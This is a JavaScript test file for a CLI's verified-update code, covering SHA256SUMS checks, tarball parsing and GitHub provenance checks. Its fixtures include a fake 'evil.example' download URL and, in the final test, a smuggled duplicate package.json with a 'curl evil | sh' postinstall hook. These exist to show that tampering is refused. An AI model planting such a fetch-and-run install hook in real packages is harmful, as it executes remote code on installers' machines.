import test from 'node:test';
import assert from 'node:assert/strict';
import { gzipSync } from 'node:zlib';
import { existsSync } from 'node:fs';
import { readFile } from 'node:fs/promises';
import { releaseTarballAssets, parseSha256Sums, sha256Hex, tarballPackageJson, verifyProvenance, downloadVerifiedRelease, RELEASE_WORKFLOW } from '../src/update-verify.mjs';
import { latestReleaseCommit, installedVersion, updatePlan, describeUpdate, VERIFIED_TARBALL } from '../src/update.mjs';

const SHA = 'c'.repeat(40);
const BASE = 'https://github.com/FAHTHIZ/oasis/releases/download/v1.9.0/';

// A minimal ustar archive, gzipped like `npm pack` output.
function tarball(files) {
  const blocks = [];
  for (const [name, text] of Object.entries(files)) {
    const body = Buffer.from(text);
    const header = Buffer.alloc(512);
    header.write(name, 0, 100);
    header.write('0000644\0', 100); header.write('0000000\0', 108); header.write('0000000\0', 116);
    header.write(body.length.toString(8).padStart(11, '0') + '\0', 124);
    header.write('00000000000\0', 136);
    header.write('0', 156);
    header.write('ustar\0', 257); header.write('00', 263);
    header.fill(' ', 148, 156);
    let sum = 0; for (const byte of header) sum += byte;
    header.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

const goodTgz = tarball({ 'package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.9.0' }), 'package/src/cli.mjs': '// cli\n' });
const assets = [
  { name: 'oasis-oss-1.9.0.tgz', browser_download_url: BASE + 'oasis-oss-1.9.0.tgz' },
  { name: 'SHA256SUMS', browser_download_url: BASE + 'SHA256SUMS' },
  { name: 'OASIS-1.9.0-x64.dmg', browser_download_url: BASE + 'OASIS-1.9.0-x64.dmg' }
];

function fakeFetch(files, seen = []) {
  return async (url) => {
    seen.push(url);
    const name = url.split('/').pop();
    if (!(name in files)) return { ok: false, status: 404, headers: new Headers() };
    const body = Buffer.from(files[name]);
    return { ok: true, status: 200, headers: new Headers({ 'content-length': String(body.length) }), body: (async function* () { yield body; })() };
  };
}

const ghVerified = async () => ({ code: 0, stdout: JSON.stringify([{ verificationResult: {} }]), stderr: '' });
const latest = { sha: SHA, tag: 'v1.9.0', tarball: releaseTarballAssets({ assets }, 'v1.9.0') };

test('the release tarball and SHA256SUMS are picked only from this repository\'s release downloads', () => {
  assert.deepEqual(releaseTarballAssets({ assets }, 'v1.9.0'), { tarball: { name: 'oasis-oss-1.9.0.tgz', url: BASE + 'oasis-oss-1.9.0.tgz' }, sums: { name: 'SHA256SUMS', url: BASE + 'SHA256SUMS' } });
  assert.equal(releaseTarballAssets({ assets }, 'v1.8.0'), null, 'a tarball for another version does not count');
  assert.equal(releaseTarballAssets({ assets: assets.slice(0, 1) }, 'v1.9.0'), null, 'no SHA256SUMS, no verified update');
  assert.equal(releaseTarballAssets({ assets: [{ ...assets[0], browser_download_url: 'https://evil.example/oasis-oss-1.9.0.tgz' }, assets[1]] }, 'v1.9.0'), null);
  assert.equal(releaseTarballAssets(null, 'v1.9.0'), null);
});

test('SHA256SUMS parsing accepts sha256sum\'s text, binary and ./ forms', () => {
  const a = 'a'.repeat(64);
  const b = 'B'.repeat(64);
  const sums = parseSha256Sums(a + '  ./oasis-oss-1.9.0.tgz\n' + b + ' *SHA-binary.bin\nnot a line\n' + 'c'.repeat(64) + '  ./oasis-oss-1.9.0.tgz\n');
  assert.equal(sums.get('oasis-oss-1.9.0.tgz'), a, 'the first entry wins');
  assert.equal(sums.get('SHA-binary.bin'), 'b'.repeat(64));
  assert.equal(sums.size, 2);
});

test('package.json is read from inside the npm tarball', () => {
  assert.deepEqual(tarballPackageJson(goodTgz), { name: 'oasis-oss', version: '1.9.0' });
  assert.equal(tarballPackageJson(tarball({ 'package/README.md': 'x' })), null);
  assert.equal(tarballPackageJson(Buffer.from('not gzip')), null);
});

test('the real v1.8.0 release tarball, when present, reads as oasis-oss 1.8.0 and matches its SHA256SUMS', async (t) => {
  if (!existsSync('/tmp/rel/oasis-oss-1.8.0.tgz')) return t.skip('release file not downloaded');
  const file = await readFile('/tmp/rel/oasis-oss-1.8.0.tgz');
  assert.deepEqual((({ name, version }) => ({ name, version }))(tarballPackageJson(file)), { name: 'oasis-oss', version: '1.8.0' });
  assert.equal(parseSha256Sums(await readFile('/tmp/rel/SHA256SUMS', 'utf8')).get('oasis-oss-1.8.0.tgz'), sha256Hex(file));
});

test('provenance is checked with gh against the release workflow, tag and commit', async () => {
  const calls = [];
  const verified = await verifyProvenance('/tmp/x.tgz', { tag: 'v1.9.0', commit: SHA, exec: async (cmd, args) => { calls.push([cmd, ...args]); return ghVerified(); } });
  assert.equal(verified.status, 'verified');
  const args = calls[0];
  assert.equal(args[0], 'gh');
  for (const [flag, value] of [['--repo', 'FAHTHIZ/oasis'], ['--signer-workflow', RELEASE_WORKFLOW], ['--source-ref', 'refs/tags/v1.9.0'], ['--source-digest', SHA]]) assert.equal(args[args.indexOf(flag) + 1], value, flag);
  assert.ok(args.includes('--deny-self-hosted-runners'));
  const status = async (result) => (await verifyProvenance('/x', { tag: 'v1.9.0', exec: async () => result })).status;
  assert.equal(await status({ code: 'ENOENT', stdout: '', stderr: '' }), 'unavailable');
  assert.equal(await status({ code: 1, stdout: '', stderr: 'Error: no attestations found for subject' }), 'none');
  assert.equal(await status({ code: 1, stdout: '', stderr: '✗ Verification failed\nexpected SourceRepositoryRef to be refs/tags/v1.9.0, got refs/heads/evil' }), 'failed');
  assert.equal(await status({ code: 1, stdout: '', stderr: 'error creating Sigstore verifier: no valid Sigstore verifiers could be initialized' }), 'unavailable');
});

test('a good tarball is downloaded, checked and handed over with notes', async () => {
  const seen = [];
  const sums = sha256Hex(goodTgz) + '  ./oasis-oss-1.9.0.tgz\n' + 'd'.repeat(64) + '  ./OASIS-1.9.0-x64.dmg\n';
  const result = await downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': goodTgz, SHA256SUMS: sums }, seen), exec: ghVerified, env: {} });
  try {
    assert.deepEqual(await readFile(result.file), goodTgz);
    assert.equal(result.provenance.status, 'verified');
    assert.match(result.notes.join('\n'), /matches SHA256SUMS[\s\S]*oasis-oss@1\.9\.0[\s\S]*Provenance: verified/);
    assert.ok(!seen.some((url) => url.endsWith('.dmg')), 'only the tarball and SHA256SUMS are fetched');
  } finally { await (await import('node:fs/promises')).rm(result.dir, { recursive: true, force: true }); }
  assert.equal(existsSync(result.dir), false);
});

test('tampered, mislabelled, unlisted or failed-provenance tarballs are refused and nothing is left behind', async () => {
  const sumsFor = (buffer) => sha256Hex(buffer) + '  ./oasis-oss-1.9.0.tgz\n';
  const tampered = Buffer.from(goodTgz); tampered[tampered.length - 9] ^= 1;
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': tampered, SHA256SUMS: sumsFor(goodTgz) }), exec: ghVerified, env: {} }), /does not match SHA256SUMS/);
  const older = tarball({ 'package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.7.0' }) });
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': older, SHA256SUMS: sumsFor(older) }), exec: ghVerified, env: {} }), /contains oasis-oss@1\.7\.0, not oasis-oss@1\.9\.0/);
  const other = tarball({ 'package/package.json': JSON.stringify({ name: 'evil', version: '1.9.0' }) });
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': other, SHA256SUMS: sumsFor(other) }), exec: ghVerified, env: {} }), /contains evil@1\.9\.0/);
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': goodTgz, SHA256SUMS: 'e'.repeat(64) + '  ./other.tgz\n' }), exec: ghVerified, env: {} }), /does not list oasis-oss-1\.9\.0\.tgz/);
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ SHA256SUMS: sumsFor(goodTgz) }), exec: ghVerified, env: {} }), /HTTP 404/);
  const failing = async () => ({ code: 1, stdout: '', stderr: 'Verification failed: signer workflow mismatch' });
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': goodTgz, SHA256SUMS: sumsFor(goodTgz) }), exec: failing, env: {} }), /Provenance check failed/);
  const noGh = async () => ({ code: 'ENOENT', stdout: '', stderr: '' });
  const relaxed = await downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': goodTgz, SHA256SUMS: sumsFor(goodTgz) }), exec: noGh, env: {} });
  assert.match(relaxed.notes.join('\n'), /Provenance: not verified, the GitHub CLI \(gh\) is not installed/);
  await (await import('node:fs/promises')).rm(relaxed.dir, { recursive: true, force: true });
  await assert.rejects(downloadVerifiedRelease(latest, { fetchImpl: fakeFetch({ 'oasis-oss-1.9.0.tgz': goodTgz, SHA256SUMS: sumsFor(goodTgz) }), exec: noGh, env: { OASIS_UPDATE_REQUIRE_PROVENANCE: '1' } }), /OASIS_UPDATE_REQUIRE_PROVENANCE/);
});

test('npm installs update from the verified release tarball and recognise it afterwards', async () => {
  const payloads = [
    { tag_name: 'v1.9.0', name: 'OASIS 1.9.0', draft: false, prerelease: false, published_at: '2026-11-30T00:00:00Z', assets },
    { sha: SHA }
  ];
  const found = await latestReleaseCommit({ fetch: async () => ({ ok: true, json: async () => payloads.shift() }) });
  assert.deepEqual(found.tarball, latest.tarball);
  const before = await installedVersion('/npm', { npmPrefix: '/opt/n', exec: async () => JSON.stringify({ dependencies: { 'oasis-oss': { version: '1.8.0', resolved: 'file:/tmp/oasis-update-x/oasis-oss-1.8.0.tgz' } } }) });
  assert.deepEqual(before, { kind: 'npm', commit: '', version: '1.8.0', root: '/npm', npmPrefix: '/opt/n' });
  const plan = updatePlan(before, found);
  assert.equal(plan.verified, true);
  assert.deepEqual(plan.steps, [{ command: 'npm', args: ['install', '-g', '--prefix', '/opt/n', VERIFIED_TARBALL] }]);
  assert.match(describeUpdate(before, found, plan), /check it against SHA256SUMS[\s\S]*npm "install" "-g" "--prefix" "\/opt\/n" <verified release tarball>/);
  assert.deepEqual(updatePlan({ ...before, version: '1.9.0' }, found), { upToDate: true });
  const legacy = updatePlan(before, { ...found, tarball: undefined });
  assert.ok(!legacy.verified);
  assert.match(describeUpdate(before, { ...found, tarball: undefined }, legacy), /installed unchecked/);
});

test('a release tarball with two package/package.json entries is refused', () => {
  // npm installs the later duplicate when its mtime is newer, so checking only the first is not enough.
  const twice = tarball({
    'package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.9.0' }),
    './package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.9.0', scripts: { postinstall: 'curl evil | sh' } })
  });
  assert.equal(tarballPackageJson(twice), null);
  assert.equal(tarballPackageJson(tarball({ 'package/package.json': '{}', 'package//package.json': '{"x":1}' })), null);
});
